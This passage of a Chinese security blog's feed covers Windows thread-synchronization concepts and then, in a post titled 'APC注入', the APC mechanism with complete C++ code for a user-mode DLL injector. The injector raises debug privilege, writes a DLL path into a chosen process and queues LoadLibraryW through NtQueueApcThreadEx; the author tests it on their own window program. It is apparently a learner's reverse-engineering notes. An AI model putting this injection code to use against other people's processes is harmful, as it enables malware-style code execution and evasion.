title="临界区"></a>临界区</h4><p>对于一段临界区代码，同一时刻只有一个线程在其中执行。如果一个数据只在临界区中被访问，那么这个数据也是线程安全的。</p><p>临界区可以不连续，但是在进入时必须触发enter函数，离开时触发leave函数以用上面几种方法防止同时访问</p><h4 id="自旋锁和忙等待"><a href="#自旋锁和忙等待" class="headerlink" title="自旋锁和忙等待"></a>自旋锁和忙等待</h4><p>忙等待：不断重复检查以第一时间获得信息。<br>自旋锁通过忙等待实现一个CPU在一段时间内对一个资源的同时拥有，即其它CPU会在这时重复检查是否可以使用这个资源，直到所有权释放</p><h4 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h4><p>接收和发送。两个进程可以相互接收和发送消息，具体实现需要依赖其它同步原语</p><h3 id="同步问题"><a href="#同步问题" class="headerlink" title="同步问题"></a>同步问题</h3><h4 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h4><blockquote><p>如果一组线程中的每个线程都在等待只能由其他线程才能满足的条件，那 么这组线程是死锁的，所有的线程都将继续等待，无法前进。 </p></blockquote><p>银行家算法</p><h4 id="饥饿"><a href="#饥饿" class="headerlink" title="饥饿"></a>饥饿</h4><blockquote><p>饥饿是指一个进程或线程满足执行的条件，但一直得不到执行，甚至 永远得不到执行（“饿死”）。饥饿通常是由资源分配策略引起的，比如由于策略而导 致不公平，有些资源请求在特定的情形下永远得不到满足。</p></blockquote><h4 id="优先级反转"><a href="#优先级反转" class="headerlink" title="优先级反转"></a>优先级反转</h4><blockquote><p>优先级反转是指这样的问题：在线程调度时，一个低优先级的线程占有一个共享资源， 从而导致高优先级的线程虽然其他运行条件都满足，但因为得不到该资源而无法运行。在 采用抢占式调度算法的操作系统中，当低优先级的线程占有了资源时，它有可能被中等优 先级的其他线程抢占，从而导致高优先级的线程在更长时间内无法运行，实际的效果就是， 相当于把高优先级的线程降到低优先级了。</p></blockquote><h3 id="中断与异常"><a href="#中断与异常" class="headerlink" title="中断与异常"></a>中断与异常</h3><h4 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h4><p>其它设备（比如IO）需要CPU响应时，会发送硬件中断给CPU，令其执行那个设备需要执行的内容。内核中的代码也可以发送软件中断，比如执行线程调度。CPU可以屏蔽中断用来专注执行一段指令，也就是使其变为原子操作。</p><h4 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h4><p>异常也分为软件异常和硬件异常。它和当前的代码&#x2F;线程有关。硬件异常有：除零错误，缺页错误等。软件异常有：软件断点陷阱等。当触发异常时，会按照固定流程执行处理异常的代码，并导致不同的结果(崩溃&#x2F;继续执行)</p>]]></content>
    
    
    <summary type="html">winwinwin</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="Win核心" scheme="https://www.pri87.vip/categories/Win%E6%A0%B8%E5%BF%83/"/>
    
    <category term="Win内核" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/Win%E5%86%85%E6%A0%B8/"/>
    
    
    <category term="多线程" scheme="https://www.pri87.vip/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
    <category term="锁" scheme="https://www.pri87.vip/tags/%E9%94%81/"/>
    
  </entry>
  
  <entry>
    <title>APC注入</title>
    <link href="https://www.pri87.vip/posts/5fe10d5b.html"/>
    <id>https://www.pri87.vip/posts/5fe10d5b.html</id>
    <published>2024-11-18T04:28:51.000Z</published>
    <updated>2024-11-27T17:32:53.778Z</updated>
    
    <content type="html"><![CDATA[<h2 id="异步过程调用"><a href="#异步过程调用" class="headerlink" title="异步过程调用"></a>异步过程调用</h2><p>Windows内核原理与实现一书：</p><p><img src="https://s2.loli.net/2024/11/18/MYfU1hFZHWbRvGV.png" alt="image-20241118124618497"></p><p><img src="https://s2.loli.net/2024/11/18/Zlq4GQ8nECaWxvi.png" alt="image-20241118124635696"></p><blockquote><p>APC（Asynchronous Procedure Call）异步过程调用是一种<code>Windows</code>操作系统的核心机制，它允许在进程上下文中执行用户定义的函数，而无需创建线程或等待OS执行完成。该机制适用于一些频繁的、短暂的或非常细微的操作，例如改变线程优先级或通知线程处理任务。在<code>APC机制</code>中，当某些事件发生时（例如文件IO，网络IO或定时器触发），这些事件将被操作系统添加到一个<code>APC队列</code>中，该队列绑定到执行线程。在下一次发生<code>ALERTABLE</code>的事件时（例如调用SleepEx或SignalObjectAndWait时），OS将弹出<code>APC函数</code>并在执行线程上下文中调用该函数，并在执行完毕后恢复线程执行。</p></blockquote><p>简要来说，一旦进程&#x2F;线程请求某些操作（比如文件操作），操作系统会将它们加入到对应线程的APC队列，当线程恢复执行时，就会依次执行队列里的函数过程。APC队列分为内核APC队列和用户APC队列，同时两种又分为普通和特殊。对于内核队列，其中的APC会优先于用户队列执行完，等到从R0回到R3，就会执行一个用户普通APC。由于特殊用户APC会直接挂到队列开头，所以特殊APC总会优先执行，且一次性执行全部。</p><p>详见：<br>[<a href="https://bbs.kanxue.com/thread-276036.htm">原创]Win10 x64 APC的分析与玩法-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><h2 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h2><p>通过向目标进程加入APC就可以实现让它读取DLL的操作，由于我没有R0权限(没学提权)，只能在R3下尝试添加用户APC。</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>必须处于可唤醒状态，可以使用以下函数达成效果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SleepEx</span>(xxx,True);</span><br><span class="line"><span class="built_in">MsgWaitForMultipleObjectsEx</span>(xxx,xxx,xxx,xxx,True);</span><br><span class="line"><span class="built_in">WaitForSingleObjectEx</span>(xxx,xxx,True);</span><br><span class="line"><span class="built_in">WaitForMultipleObjectEx</span>(xxx,xxx,xxx,xxx,True);</span><br><span class="line"><span class="built_in">SignalObjectAndWait</span>(xxx,xxx,xxx,True);</span><br></pre></td></tr></table></figure><p>具体流程为：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取目标pid-&gt;申请空间-&gt;写入DLL路径-&gt;获取LoadLibrary地址-&gt;用APC挂钩函数挂上LoadLibrary函数，传参DLL路径</span><br></pre></td></tr></table></figure><p>直接写代码即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(*NtQueueApcThreadEx)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE thread,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 flag,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 NormalRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 NormalContext,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 s1,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 s2</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="built_in">NTSTATUS</span>(*pNtQueueApcThreadEx)</span><br><span class="line">(</span><br><span class="line">HANDLE thread,</span><br><span class="line">ULONG64 flag,</span><br><span class="line">ULONG64 NormalRoutine,</span><br><span class="line">ULONG64 NormalContext,</span><br><span class="line">ULONG64 s1,</span><br><span class="line">ULONG64 s2</span><br><span class="line">) = <span class="literal">NULL</span>;</span><br><span class="line">LPTHREAD_START_ROUTINE pLoadLibrary = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hToken;</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">LUID luid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开当前进程的访问令牌</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;无法打开进程令牌。错误: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找调试特权的LUID</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;luid)) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;无法查找调试特权的LUID。错误: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置特权</span></span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调整特权</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(TOKEN_PRIVILEGES), <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;无法调整令牌特权。错误: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查调整特权的结果</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetLastError</span>() == ERROR_NOT_ALL_ASSIGNED) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;令牌不具有指定的特权。错误: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取目标pid-&gt;申请空间-&gt;写入DLL路径-&gt;获取LoadLibrary地址-&gt;用APC挂钩函数挂上LoadLibrary函数，传参DLL路径</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">PVOID <span class="title">getFunction</span><span class="params">(LPCSTR ModuleName, LPCSTR funcName, HMODULE&amp; hMoule)</span> </span>&#123;</span><br><span class="line">hMoule = <span class="built_in">GetModuleHandleA</span>(ModuleName);</span><br><span class="line"><span class="keyword">if</span> (!hMoule) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;模块打开失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">PVOID pfunc = <span class="built_in">GetProcAddress</span>(hMoule, funcName);</span><br><span class="line"><span class="keyword">if</span> (!pfunc) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;函数查找失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pfunc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">//防止访问权限不够，使用令牌提高权限</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">EnableDebugPrivilege</span>()) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;调整权限失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Ntdll和NtQueueApcThreadEx</span></span><br><span class="line">HMODULE hNtdll;</span><br><span class="line">pNtQueueApcThreadEx = (NtQueueApcThreadEx)<span class="built_in">getFunction</span>(<span class="string">&quot;Ntdll&quot;</span>, <span class="string">&quot;NtQueueApcThreadEx&quot;</span>, hNtdll);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取kernal32和LoadLibrary</span></span><br><span class="line">HMODULE hKernel32;</span><br><span class="line">pLoadLibrary = (LPTHREAD_START_ROUTINE)<span class="built_in">getFunction</span>(<span class="string">&quot;kernel32&quot;</span>, <span class="string">&quot;LoadLibraryW&quot;</span>, hKernel32);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取PID</span></span><br><span class="line">DWORD dwPid = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;请输入进程PID：&quot;</span>;</span><br><span class="line">std::cin &gt;&gt; dwPid;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//申请空间</span></span><br><span class="line">WCHAR dllpath[] = <span class="string">L&quot;C:\\Users\\a2879\\source\\repos\\valentForAPCinject\\x64\\Debug\\messageboxDLL.dll&quot;</span>;</span><br><span class="line">LPVOID lpDLLpath = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(dllpath) + <span class="number">1</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!lpDLLpath) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;内存分配失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写入dll路径</span></span><br><span class="line">SIZE_T bytesWritten;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, lpDLLpath, dllpath, <span class="built_in">sizeof</span>(dllpath) + <span class="number">1</span>, &amp;bytesWritten)) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;写入失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//取线程</span></span><br><span class="line">DWORD dwThreadID;</span><br><span class="line">THREADENTRY32 te32 = &#123;&#125;;</span><br><span class="line">te32.dwSize = <span class="built_in">sizeof</span>(THREADENTRY32);</span><br><span class="line">HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">std::vector&lt;DWORD&gt; Vthread = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hSnapshot, &amp;te32)) &#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwPid) &#123;</span><br><span class="line">Vthread.<span class="built_in">push_back</span>(te32.th32ThreadID);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hSnapshot, &amp;te32));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = Vthread.<span class="built_in">rbegin</span>(); it != Vthread.<span class="built_in">rend</span>(); it++) &#123;</span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);</span><br><span class="line"><span class="keyword">if</span> (hThread) &#123;</span><br><span class="line"><span class="built_in">pNtQueueApcThreadEx</span>(hThread, <span class="number">1</span>, (ULONG64)pLoadLibrary, (ULONG64)lpDLLpath, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//特殊用户APC</span></span><br><span class="line"><span class="comment">//QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)lpDLLpath);//普通用户APC</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;成功执行:&quot;</span> &lt;&lt; *it &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="comment">//break;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;无法打开线程\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;执行结束&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上代码通过在管理员权限下运行，然后创建一个带窗口的程序进行测试。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg) &#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE: &#123;</span><br><span class="line"><span class="built_in">CreateWindow</span>(</span><br><span class="line"><span class="string">L&quot;BUTTON&quot;</span>, <span class="string">L&quot;test&quot;</span>,</span><br><span class="line">WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,</span><br><span class="line"><span class="number">10</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">30</span>,</span><br><span class="line">hwnd, (HMENU)<span class="number">1</span>, <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND: &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOWORD</span>(wParam) == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">SleepEx</span>(<span class="number">1000</span>, TRUE);<span class="comment">//调用会进行APC执行的函数，true表明会被APC执行打断，从而产生效果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY: &#123;</span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nCmdShow)</span> </span>&#123;</span><br><span class="line">WNDCLASS wc = &#123;&#125;;</span><br><span class="line">wc.lpfnWndProc = WindowProc;</span><br><span class="line">wc.hInstance = hInstance;</span><br><span class="line">wc.lpszClassName = <span class="string">L&quot;testForAPC&quot;</span>;</span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wc);</span><br><span class="line"></span><br><span class="line">HWND hwnd = <span class="built_in">CreateWindowEx</span>(</span><br><span class="line"><span class="number">0</span>, <span class="string">L&quot;testForAPC&quot;</span>, <span class="string">L&quot;testForAPC&quot;</span>,</span><br><span class="line">WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, <span class="number">640</span>, <span class="number">480</span>,</span><br><span class="line"><span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd, nCmdShow);</span><br><span class="line"></span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好像是概率成功，和APC执行靠概率有联系。同时好像必须用窗口程序，如果是命令行就一定不会触发。经过实测，注入后会直接成功而不需要触发SleepEx或者WaitingForSingleObject之类的函数,怀疑是窗口本身因素的影响</p><hr><h2 id="没解决的问题"><a href="#没解决的问题" class="headerlink" title="没解决的问题"></a>没解决的问题</h2><p>其它程序注入后没有效果，<br>不知道为什么要逆序注入才不会崩溃</p>]]></content>
    
    
    <summary type="html">一种注入的方式</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="技能" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="DLL注入" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/DLL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="shellcode注入" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/shellcode%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="DLL注入" scheme="https://www.pri87.vip/tags/DLL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
